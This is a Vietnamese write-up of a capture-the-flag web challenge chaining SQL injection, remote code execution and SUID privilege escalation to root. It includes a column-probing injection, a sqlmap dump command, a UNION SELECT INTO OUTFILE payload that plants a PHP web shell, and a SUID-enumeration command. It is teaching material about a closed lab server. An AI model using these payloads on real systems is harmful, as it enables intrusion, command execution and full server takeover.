## 1. Về Challange
Đây là giải CTF của EFIENS Individual CTF, team hiện đứng thứ 3 VN trên CTFtime.org, được tổ chức bằng hình thức Jeopardy  từ 24/11 - 1/12. Trong số các bài về Web có một series gồm 3 bài về SQLi => RCE => Get **ROOT**.<br><br>
Qua các challange này, các bạn sẽ có thêm kiến thức về sự nguy hiểm của SQLi, cũng như việc upload reverse shell để thực thi lệnh trên victim, cũng như về Privilege Escalation trong Linux. <br><br>
<b>Hiện tại sever đã đóng </b>

## 2. Write up

### 2.1. SQL Injection
Website cho phép ta tra cứu thông tin của CSA officer theo ID, khi ta nhập ID vào, Website sẽ trả cho ta value tương ứng như hình dưới, với 4 cột cụ thể:<br><br>
![](https://images.viblo.asia/f1e731f0-82fa-4508-8c5d-7cc314a15b62.png)<br>
Để chắc chắn chỉ có 4 cột, ta nhập query: <br>
` 10" order by  5#` : Không trả ra row kết quả nào => Lỗi => Chỉ có 4 cột như trên<br><br>
Dự đoán query phía backend: <Br>
`SELECT id, name, username, email FROM TABLE_NAME WHERE id = $_POST['text']` <br><br>
Tuy là ban đầu làm mình inject query bằng tay và vẫn ra flag, nhưng với những trường hợp như thế này chúng ta vẫn nên tiết kiệm thời gian bằng cách sử dụng tools, cụ thể là SQLmap:<br>
    Câu lệnh: `sudo sqlmap -r sqli.req --dump` với sqli.req là file text chứa request gửi lên Web Server<br><br>
    ![](https://images.viblo.asia/9e3c126a-1ae4-4b8a-8201-56abf3c4f4c2.png)

    
###     2.2. Remote Code Execution
Từ SQLi to RCE, nhất là đối với website sử dụng LAMP Stack như website trên, các bạn có thể tham khảo video đã đươc trình bày ở DEFCON tại [đây](https://www.youtube.com/watch?v=Uz6G_YAQb2U&t=1801s) . Hình ảnh được lấy từ video.<Br><br>. 
    ![](https://images.viblo.asia/32df0c50-73a8-47e3-9f58-0f231072c20c.png)

    
 Từ SQLi, chúng ta có thể ghi đè 1 file trên sever, trong trường hợp này mình sẽ tạo mới 1 file PHP với payload đơn giản bên trong:<br>
   ` <?php system($_GET["cmd"]); ?>` và đưa lên Web Sever, Payload:<br><br>
`    " UNION SELECT 1,2,3,'123 <?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/rce.php'#`<br><br>
Sau khi RCE thành công, việc đơn giản còn lại chỉ là cat flag.txt <br>
    ![](https://images.viblo.asia/d06519b6-5509-4bf3-9588-62b7f8a17d6e.png)

### 2.3.    Get Root
 Về Privilege Escalation, chúng ta có 6 methods chính, trong bài này chúng ta sẽ sử dụng: **Exploiting SUID executables**.
 Bài viết chi tiết các bạn có thể tham khảo tại [đây](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/). <br><Br>
    Trong bài này, khi đã netcat thành công, mình sẽ netcat thêm một lần nữa để có thể dùng 1 reverse shell dựa trên PHP. Như vậy sẽ dễ thao tác hơn.<br><br>
    Liệt kê tất cả các binaries có SUID permissions: `find / -perm -u=s -type f 2>/dev/null`<br><br>
    Với SUID `time`  chúng ta có thể thực thi như Root:<br>

![](https://images.viblo.asia/b14918cc-cdea-4d05-a3a6-f9b57bc9b798.png)<br><br>
Game là dễ, đến đây chỉ việc cat flag:<br>
    ![](https://images.viblo.asia/269f4409-8651-4901-b041-d77f1d178648.png)

##     3. Kết luận
Đây là 1 challange mở và thú vị. Thông qua việc tìm các flag, các bạn có thể học thêm một số thứ về security và các lỗ hổng nguy hiểm đối với hệ thống.